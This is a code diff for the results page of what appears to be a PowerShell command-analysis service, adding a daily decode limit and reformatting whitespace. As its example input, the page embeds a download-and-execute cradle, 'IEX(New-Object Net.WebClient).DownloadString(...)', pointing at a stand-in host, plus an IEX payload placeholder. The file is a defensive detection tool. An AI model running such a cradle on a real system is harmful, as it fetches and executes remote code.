@@ -16,7 +16,7 @@ import CommandInput from "../components/CommandInput";
 import { ErrorMessage, InfoMessage } from "../components/Messages";
 import IndicatorsSummaryTable from "../components/IndicatorsSummaryTable";
 
-  import { saveAnonymousAnalysis } from "../../utils/cookies";
+import { saveAnonymousAnalysis } from "../../utils/cookies";
 import { getOrCreateSession, saveSessionFromBackend } from "../../utils/session";
 
 // Score-based color system (5 bins from 1-10)
@@ -37,7 +37,7 @@ function getScoreLabel(score) {
 }
 
 // ✅ Componente para conteúdo protegido (adicionar no início do arquivo se ainda não existir)
-const ProtectedCodeBlock = ({ code, borderColorClass = "border-gray-500/20" }) => {
+const ProtectedCodeBlock = ({ code, borderColorClass = "border-gray-500/20", limitReached = false }) => {
   const isProtected = code === "[PREMIUM_PROTECTED_CONTENT]";
 
   if (isProtected) {
@@ -52,17 +52,22 @@ IEX([System.Text.Encoding]::Unicode.GetString($payload))
 # Threat analysis requires elevated access
 # ...`}
         </div>
-        
+
         <div className="absolute inset-0 flex flex-col items-center justify-center z-10 bg-black/60 backdrop-blur-xl backdrop-saturate-150 border border-green-500/20 rounded-lg">
           <div className="absolute inset-0 bg-gradient-to-br from-green-500/5 to-transparent rounded-lg"></div>
-          
+
           <div className="relative rounded-xl p-6 flex flex-col items-center gap-3 shadow-2xl">
-            <div className="text-4xl drop-shadow-lg">🔒</div>
+            <div className="text-4xl drop-shadow-lg">
+              {limitReached ? "⏳" : "🔒"}
+            </div>
             <span className="font-mono font-bold text-green-400 text-lg tracking-wide drop-shadow-lg" style={{ color: 'var(--accent)', filter: 'drop-shadow(0 0 8px rgba(34, 197, 94, 0.6))' }}>
-              Premium Feature
+              {limitReached ? "Daily Decode Limit Reached" : "Premium Feature"}
             </span>
             <span className="text-xs text-gray-300 text-center leading-relaxed font-mono">
-              Exclusive decoded & deobfuscated payloads for premium users. Upgrade to unlock advanced threat intelligence.
+              {limitReached
+                ? "You have reached your daily limit of 5 decodes. Upgrade to Premium for unlimited access."
+                : "Exclusive decoded & deobfuscated payloads for premium users. Upgrade to unlock advanced threat intelligence."
+              }
             </span>
           </div>
         </div>
@@ -83,9 +88,9 @@ export default function AnalysisPage() {
   const { user, isAuthenticated } = useAuth();
   const { notifyNewAnalysis } = useAnalysisEvent();
   const { ipAddress, ipCountry, loading: ipLoading, error: ipError } = useIpAddress();
-  const { 
-    rateLimitInfo, 
-    handleRateLimitResponse, 
+  const {
+    rateLimitInfo,
+    handleRateLimitResponse,
     reset: resetRateLimit,
     timeLeft,
     isTimerActive,
@@ -107,55 +112,55 @@ export default function AnalysisPage() {
       const finalIpCountry = providedIpCountry || ipCountry;
       try {
         setError("");
-        
+
         console.log("🔍 [ANALYSIS_LEGACY] Analyzing command:", command.substring(0, 100) + "...");
-        
+
         const timeoutPromise = new Promise((_, reject) =>
           setTimeout(() => reject(new Error('Analysis timeout - taking too long')), 15000)
         );
         const sessionId = getOrCreateSession();
-        
+
         // ✅ FIX: Enviar comando sem trim - preservar espaços
-        const requestData = { 
+        const requestData = {
           command: command, // ✅ SEM TRIM
-          user_id: user?.id || null, 
+          user_id: user?.id || null,
           ip_address: finalIpAddress,
           country: finalIpCountry,
           user_agent: navigator.userAgent,
-          search_type: "WEB",  
+          search_type: "WEB",
           session_id: sessionId
         };
-        
+
         console.log("🌐 [ANALYSIS_LEGACY] Request type:", user?.id ? "Authenticated WEB" : "Anonymous WEB");
 
         const { makeAuthenticatedRequest } = await import('../../lib/api');
-        
+
         const analysisPromise = makeAuthenticatedRequest('/evaluate', {
           method: 'POST',
           body: JSON.stringify(requestData)
         }).then(async response => {
           const data = await response.json();
-          
+
           const isFromCache = data.from_cache === true;
-          
+
           if (isFromCache) {
             setFreshAnalysisLoading(false);
           } else {
-           
-            
+
+
             setFreshAnalysisLoading(true);
           }
-          
+
           const needsHandling = handleRateLimitResponse(response, data);
-          
+
           if (needsHandling) {
             throw new Error('Rate limit excedido');
           }
-          
+
           if (!response.ok) {
             throw new Error(data.error || `HTTP error! status: ${response.status}`);
           }
-          
+
           return data;
         }).catch(error => {
           setFreshAnalysisLoading(true);
@@ -164,24 +169,24 @@ export default function AnalysisPage() {
           }
           throw new Error(`Erro da API: ${error.message}`);
         });
-   
+
         let response;
         try {
           response = await analysisPromise;
         } catch (error) {
-        
+
           throw error;
         }
-        
+
         if (response.success) {
           const isFromCache = response.from_cache === true;
-          
+
           const analysisData = response.analysis;
-          
+
           if (response.session_id && !user?.id) {
             saveSessionFromBackend(response.session_id);
           }
-          
+
           if (!user?.id) {
             try {
               saveAnonymousAnalysis({
@@ -196,34 +201,35 @@ export default function AnalysisPage() {
               console.error('❌ [ANALYSIS PAGE] error:', error);
             }
           }
-          
+
           if (response.analysis_id) {
 
             notifyNewAnalysis();
-            
-     
+
+
             router.push(`/analysis/${response.analysis_id}`);
-            return; 
+            return;
           }
-          
+
           const analysisResult = {
             score: analysisData.risk_score,
             severity: analysisData.is_malicious ? "malicious" : "safe",
             signatures: (analysisData.signatures_detected || []).sort((a, b) => (b.total_score || 0) - (a.total_score || 0)),
             decoded: analysisData.decoded_command || null,
             doubleDecoded: analysisData.double_decoded_command || null,
-            deobfuscated: analysisData.deobfuscated_command || null,  // ✅ ADICIONAR
+            deobfuscated: analysisData.deobfuscated_command || null,
+            decodeLimitReached: analysisData.decode_limit_reached || false,
             indicators: analysisData.analysis_details?.indicators || [],
             details: analysisData.analysis_details?.recommendations?.join(", ") || "",
             tactics: analysisData.tactics || [],
             techniques: analysisData.techniques || [],
-            analysisId: response.analysis_id, 
+            analysisId: response.analysis_id,
             fromCache: isFromCache,
             cacheInfo: response.analysis?.cache_info
           };
-          
+
           setResult(analysisResult);
-          
+
           // Smooth transition delay
           setTimeout(() => {
             setContentReady(true);
@@ -236,9 +242,9 @@ export default function AnalysisPage() {
           setLoading(false);
           setFreshAnalysisLoading(false);
           setContentReady(true);
-          return; 
+          return;
         }
-        
+
         setError(err.message);
         setResult(null);
         setContentReady(true);
@@ -268,13 +274,13 @@ export default function AnalysisPage() {
         setError("Rate limit reached. Please wait for the timer to reset.");
         return;
       }
-      
-      analysisExecutedRef.current = false; 
+
+      analysisExecutedRef.current = false;
       setError("");
-      
+
       // ✅ FIX: Enviar comando raw sem trim ou validação
       await performAnalysis(newCommand);
-      
+
       setNewCommand("");
     }
   };
@@ -283,21 +289,21 @@ export default function AnalysisPage() {
     const command = params.get("cmd") || "";
     const ipAddress = params.get("ip") || null;
     const country = params.get("country") || null;
-    
+
     setCmd(command);
     setNewCommand(command);
-    
+
     // ✅ FIX: Processar comando mesmo que seja vazio ou apenas espaços
     if (command.length > 0 && !analysisExecutedRef.current) {
       analysisExecutedRef.current = true;
-      
+
       const ipLocation = {
         country,
         city,
         region,
         timezone
       };
-      
+
       performAnalysis(command);
     } else if (command.length === 0) {
       setLoading(false);
@@ -312,9 +318,9 @@ export default function AnalysisPage() {
       });
     }
   }, [params, performAnalysis]);
-  
+
   const totalScore = result ? result.score : 0;
-  
+
   if (loading && freshAnalysisLoading && !contentReady) {
     return <LoadingSpinner />;
   }
@@ -323,7 +329,7 @@ export default function AnalysisPage() {
   const hasObfuscationIndicator = result?.signatures?.some(
     sig => sig.name === "Obfuscation Detected"
   );
-  
+
   return (
     <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 animate-fade-in">
       <style jsx>{`
@@ -341,11 +347,11 @@ export default function AnalysisPage() {
           animation: fade-in 0.4s ease-out;
         }
       `}</style>
-      <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center" style={{color: 'var(--accent)'}}>
-         Evaluation Results
-       </h1>
+      <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center" style={{ color: 'var(--accent)' }}>
+        Evaluation Results
+      </h1>
 
-    
+
       <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
         <div className="flex flex-col sm:flex-row gap-3 items-start">
           <div className="flex-1 w-full">
@@ -366,7 +372,7 @@ export default function AnalysisPage() {
             {freshAnalysisLoading ? 'Analyzing...' : 'Evaluate'}
           </ThemedButton>
         </div>
-        <InfoMessage 
+        <InfoMessage
           message={!error && newCommand.length === 0 ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
           clickable={!error && newCommand.length === 0}
           onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
@@ -377,8 +383,8 @@ export default function AnalysisPage() {
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mt-4 mb-6 rounded-lg border-2 bg-black/80 border-green-500/30">
           <div className="p-4">
             <div className="text-center mb-4">
-              <div className="font-mono text-sm mb-2" style={{color: 'var(--muted-foreground)'}}>
-                <strong>Notice:</strong> You have made <span style={{color: 'var(--accent)'}}>{rateLimitInfo.current_count}</span> of <span style={{color: 'var(--accent)'}}>{rateLimitInfo.limit}</span> allowed searches in {rateLimitInfo.window_seconds} seconds.
+              <div className="font-mono text-sm mb-2" style={{ color: 'var(--muted-foreground)' }}>
+                <strong>Notice:</strong> You have made <span style={{ color: 'var(--accent)' }}>{rateLimitInfo.current_count}</span> of <span style={{ color: 'var(--accent)' }}>{rateLimitInfo.limit}</span> allowed searches in {rateLimitInfo.window_seconds} seconds.
               </div>
             </div>
 
@@ -390,29 +396,29 @@ export default function AnalysisPage() {
                     <span className="font-mono font-bold text-red-500">Rate limit reached</span>
                   </div>
                 </div>
-                
+
                 {isTimerActive && timeLeft > 0 && (
                   <div className="text-center">
                     <div className="inline-block p-6 rounded-xl border-2 bg-black/80 border-green-500/30">
                       <div className="text-4xl mb-3">⏰</div>
-                      
-                      <div className="font-mono font-bold text-xl mb-3" style={{color: 'var(--accent)'}}>
+
+                      <div className="font-mono font-bold text-xl mb-3" style={{ color: 'var(--accent)' }}>
                         Wait for reset
                       </div>
-                      
+
                       <div className="font-mono text-3xl font-bold mb-4 px-4 py-2 rounded-lg border bg-black/80 border-green-500/30" style={{
                         color: 'var(--accent)'
                       }}>
                         {formatTime}
                       </div>
-                      
-                      <div className="font-mono text-sm max-w-xs mx-auto" style={{color: 'var(--muted-foreground)'}}>
+
+                      <div className="font-mono text-sm max-w-xs mx-auto" style={{ color: 'var(--muted-foreground)' }}>
                         You can make new searches when the timer reaches zero
                       </div>
-                      
+
                       <div className="mt-4 w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
-                        <div 
-                          className="h-2 rounded-full transition-all duration-1000" 
+                        <div
+                          className="h-2 rounded-full transition-all duration-1000"
                           style={{
                             backgroundColor: 'var(--accent)',
                             width: `${Math.max(0, (timeLeft / 60) * 100)}%`
@@ -428,14 +434,14 @@ export default function AnalysisPage() {
         </div>
       )}
 
-     
+
       {result && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="p-4 sm:p-6 rounded-lg border-2 border-green-400 text-center relative bg-black/80 border-green-500/30">
             <div className="absolute top-4 right-4">
               <SeverityLegend />
             </div>
-            
+
             <div className="text-lg sm:text-xl font-mono font-bold mb-3 text-green-400">
               Cumulative Base Score
             </div>
@@ -448,16 +454,16 @@ export default function AnalysisPage() {
             {result.signatures && result.signatures.length > 0 && (
               <div className="text-xs font-mono text-gray-400  pt-3 mt-3">
                 {(() => {
-                  const securitySigs = result.signatures.filter(sig => 
+                  const securitySigs = result.signatures.filter(sig =>
                     !sig.name.includes('(') || sig.score >= 4.0 || !sig.techniques?.includes('T1059.001') || sig.tactics?.length > 1
                   );
-                  const allCmdlets = result.signatures.filter(sig => 
+                  const allCmdlets = result.signatures.filter(sig =>
                     sig.name.includes('(') && sig.score < 4.0 && sig.techniques?.includes('T1059.001') && sig.tactics?.length <= 1
                   );
-                  
+
                   const securityScore = securitySigs.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
                   const allCmdletScore = allCmdlets.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
-                  
+
                   return (
                     <>
                       {allCmdletScore > 0 && <div>PowerShell Cmdlets: {allCmdletScore.toFixed(1)}</div>}
@@ -477,11 +483,11 @@ export default function AnalysisPage() {
       {result && result.deobfuscated && hasObfuscationIndicator && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-purple-500/30">
-            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
+            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
               🔓 Deobfuscated Command
             </div>
-            <ProtectedCodeBlock code={result.deobfuscated} borderColorClass="border-purple-500/20" />
-            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
+            <ProtectedCodeBlock code={result.deobfuscated} borderColorClass="border-purple-500/20" limitReached={result.decodeLimitReached} />
+            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
               Format string obfuscation was removed (e.g., &#123;&quot;&#123;1&#125;&#123;0&#125;&quot; -f &apos;EX&apos;,&apos;I&apos;&#125; → &apos;IEX&apos;)
             </div>
           </div>
@@ -492,11 +498,11 @@ export default function AnalysisPage() {
       {result && result.decoded && result.doubleDecoded && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
-            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
-               First Decoded Layer (Iteration 1)
+            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
+              First Decoded Layer (Iteration 1)
             </div>
-            <ProtectedCodeBlock code={result.decoded} borderColorClass="border-blue-500/20" />
-            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
+            <ProtectedCodeBlock code={result.decoded} borderColorClass="border-blue-500/20" limitReached={result.decodeLimitReached} />
+            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
               First layer of decoding - still contains -EncodedCommand
             </div>
           </div>
@@ -507,11 +513,11 @@ export default function AnalysisPage() {
       {result && result.decoded && !result.doubleDecoded && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
-            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
+            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
               🔓 Decoded Command
             </div>
-            <ProtectedCodeBlock code={result.decoded} borderColorClass="border-blue-500/20" />
-            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
+            <ProtectedCodeBlock code={result.decoded} borderColorClass="border-blue-500/20" limitReached={result.decodeLimitReached} />
+            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
               This is the decoded version from -EncodedCommand
             </div>
           </div>
@@ -522,11 +528,11 @@ export default function AnalysisPage() {
       {result && result.doubleDecoded && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-yellow-500/30">
-            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
-               Final Decoded Command (Iteration 2)
+            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
+              Final Decoded Command (Iteration 2)
             </div>
-            <ProtectedCodeBlock code={result.doubleDecoded} borderColorClass="border-yellow-500/20" />
-            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
+            <ProtectedCodeBlock code={result.doubleDecoded} borderColorClass="border-yellow-500/20" limitReached={result.decodeLimitReached} />
+            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
               Final layer decoded from multiple nested -EncodedCommand (2+ layers detected)
             </div>
           </div>
@@ -534,19 +540,19 @@ export default function AnalysisPage() {
       )}
 
       {result && result.signatures && result.signatures.length > 0 && (
-         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
+        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           {(() => {
-            const realSignatures = result.signatures.filter(sig => 
-              !sig.name.includes('(') || 
-              sig.score >= 4.0 || 
-              !sig.techniques?.includes('T1059.001') || 
-              sig.tactics?.length > 1 
+            const realSignatures = result.signatures.filter(sig =>
+              !sig.name.includes('(') ||
+              sig.score >= 4.0 ||
+              !sig.techniques?.includes('T1059.001') ||
+              sig.tactics?.length > 1
             );
-            
-            const basicCmdlets = result.signatures.filter(sig => 
+
+            const basicCmdlets = result.signatures.filter(sig =>
               sig.name.includes('(') &&
-              sig.score < 4.0 && 
-              sig.techniques?.includes('T1059.001') && 
+              sig.score < 4.0 &&
+              sig.techniques?.includes('T1059.001') &&
               sig.tactics?.length <= 1
             );
 
@@ -556,10 +562,10 @@ export default function AnalysisPage() {
                 {realSignatures.length > 0 && (
                   <IndicatorsSummaryTable signatures={realSignatures} />
                 )}
-                
+
                 {realSignatures.length > 0 && (
                   <div className="mb-6">
-                    <h2 className="text-lg sm:text-xl font-mono font-bold mb-4" style={{color: 'var(--foreground)'}}>
+                    <h2 className="text-lg sm:text-xl font-mono font-bold mb-4" style={{ color: 'var(--foreground)' }}>
                       Indicators Breakdown
                     </h2>
                     <div className="space-y-4">
@@ -593,24 +599,24 @@ export default function AnalysisPage() {
                 )}
 
                 {basicCmdlets.length > 0 && (
-                    <div className="mb-6">
-                      <h3 className="text-base font-mono font-bold mb-3" style={{color: 'var(--muted-foreground)'}}>
-                        PowerShell Cmdlets ({basicCmdlets.length})
-                      </h3>
+                  <div className="mb-6">
+                    <h3 className="text-base font-mono font-bold mb-3" style={{ color: 'var(--muted-foreground)' }}>
+                      PowerShell Cmdlets ({basicCmdlets.length})
+                    </h3>
                     <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                       {basicCmdlets.map((cmdlet, index) => (
-                        <div 
+                        <div
                           key={`cmdlet-${index}`}
                           className="border rounded p-3 text-center bg-black/80 border-green-500/30"
                         >
-                          <div className="font-mono text-sm font-bold mb-1" style={{color: 'var(--foreground)'}}>
+                          <div className="font-mono text-sm font-bold mb-1" style={{ color: 'var(--foreground)' }}>
                             {cmdlet.name}
                           </div>
-                          <div className="text-xs font-mono" style={{color: 'var(--muted-foreground)'}}>
+                          <div className="text-xs font-mono" style={{ color: 'var(--muted-foreground)' }}>
                             Score: {cmdlet.total_score || cmdlet.score} • Basic PowerShell
                           </div>
                           {cmdlet.matches_found > 1 && (
-                            <div className="text-xs font-mono mt-1" style={{color: 'var(--accent)'}}>
+                            <div className="text-xs font-mono mt-1" style={{ color: 'var(--accent)' }}>
                               {cmdlet.matches_found} matches • Base: {cmdlet.base_score || cmdlet.score}
                             </div>
                           )}
@@ -626,25 +632,25 @@ export default function AnalysisPage() {
       )}
 
       {result && (!result.signatures || result.signatures.length === 0) && totalScore === 0 && (
-               <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
-         <div className="border rounded-lg p-6 text-center bg-black/80 border-green-500/30">
-           <h2 className="text-lg sm:text-xl font-mono font-bold mb-2" style={{color: 'var(--foreground)'}}>
-             Zero indicators found
-           </h2>
-           <p className="text-sm sm:text-base font-mono" style={{color: 'var(--muted-foreground)'}}>
-             This command does not seem to match any indicator.
-           </p>
-         </div>
-       </div>
+        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
+          <div className="border rounded-lg p-6 text-center bg-black/80 border-green-500/30">
+            <h2 className="text-lg sm:text-xl font-mono font-bold mb-2" style={{ color: 'var(--foreground)' }}>
+              Zero indicators found
+            </h2>
+            <p className="text-sm sm:text-base font-mono" style={{ color: 'var(--muted-foreground)' }}>
+              This command does not seem to match any indicator.
+            </p>
+          </div>
+        </div>
       )}
 
       {result && result.signatures && result.signatures.length > 0 && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-green-500/30">
-            <div className="font-mono text-sm" style={{color: 'var(--muted-foreground)'}}>
+            <div className="font-mono text-sm" style={{ color: 'var(--muted-foreground)' }}>
               Matched indicators are not inherently suspicious but highlight traces that may require closer examination. For interpretation details, check the link below:
               <br /><br />
-              <span style={{color: 'var(--primary-purple)'}}>&lt;wiki link to be provided later&gt;</span>
+              <span style={{ color: 'var(--primary-purple)' }}>&lt;wiki link to be provided later&gt;</span>
             </div>
           </div>
         </div>
@@ -658,9 +664,9 @@ export default function AnalysisPage() {
           variant="outline"
           onClick={() => {
             const baseUrl = window.location.origin;
-            const shareUrl = result?.analysisId 
+            const shareUrl = result?.analysisId
               ? `${baseUrl}/analysis/${result.analysisId}`
-              : window.location.href; 
+              : window.location.href;
             navigator.clipboard.writeText(shareUrl);
           }}
         >
